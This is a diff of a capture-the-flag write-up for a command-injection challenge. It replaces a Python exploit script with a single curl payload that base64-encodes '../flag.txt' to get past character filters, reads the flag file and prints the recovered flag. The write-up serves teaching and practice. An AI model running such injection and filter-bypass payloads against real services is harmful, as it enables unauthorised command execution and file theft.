@@ -103,24 +103,8 @@ if __name__ == '__main__':
       $ curl -X POST https://braekerctf-empty-execution.chals.io/run_command -d '{"command": ". ;which base64;which echo"}' -H 'Content-Type: application/json'
       {"message":"Command output: /bin/base64\n/bin/echo\n"}
 
-- Now we can craft a payload with base64 and echo,I was able to craft this payload `base64 $(echo 'Li4vZmxhZy50eHQK' | base64 -d)`.I encoded '../flag.txt' with base64 since flag.txt is not present in the current directory, we will need to move up one directory and .. and / are both filtered by the code.Echo pipes it to base64 which decodes it and the process is executed with $().Base64 can read files passed to it and return it in base64 encoded text.The flag is encoded and returned back to us in base64 text.
+- Now we can craft a payload with base64 and echo,I was able to craft this payload `base64 $(echo 'Li4vZmxhZy50eHQK' | base64 -d)`.I encoded '../flag.txt' with base64 since flag.txt is not present in the current directory, we will need to move up one directory and .. and / are both filtered by the code.Echo pipes it to base64 which decodes it and the process is executed with $().Base64 can read files passed to it and return it in base64 encoded text.After that, the result of that will be transferred to `base64 -d` via a pipe to decode the base64 encoded flag.
+         
+              curl -X POST https://braekerctf-empty-execution.chals.io/run_command -d '{"command": ". ;echo $(base64 $(echo 'Li4vZmxhZy50eHQK' | base64 -d)) | base64 -d"}' -H 'Content-Type: application/json'
+         {"message":"Command output: brck{Ch33r_Up_BuddY_JU5t_3x3Cut3_4_D1reCT0ry}"}
 
-        curl -X POST https://braekerctf-empty-execution.chals.io/run_command -d '{"command": ". ;base64 $(echo 'Li4vZmxhZy50eHQK' | base64 -d)"}' -H 'Content-Type: application/json'
-      {"message":"Command output: YnJja3tDaDMzcl9VcF9CdWRkWV9KVTV0XzN4M0N1dDNfNF9EMXJlQ1Qwcnl9\n"} 
-
-- I automated it with python to receive the flag and decode it.
-
-      #! /usr/bin/env python3
-      import requests
-      import json
-      import base64
-      headers = {"Content-Type": "application/json"}
-      data = data = {'command':'. ;base64 $(echo \'Li4vZmxhZy50eHQK\' | base64 -d)'}
-      response = requests.post("https://braekerctf-empty-execution.chals.io/run_command",data=json.dumps(data),headers=headers).text
-      encodedFlag=json.loads(response)["message"].split('Command output: ')[1].encode()
-      print(base64.b64decode(encodedFlag).decode())
-
-- Flag
-
-      $ ./emptyexec.py
-        brck{Ch33r_Up_BuddY_JU5t_3x3Cut3_4_D1reCT0ry}
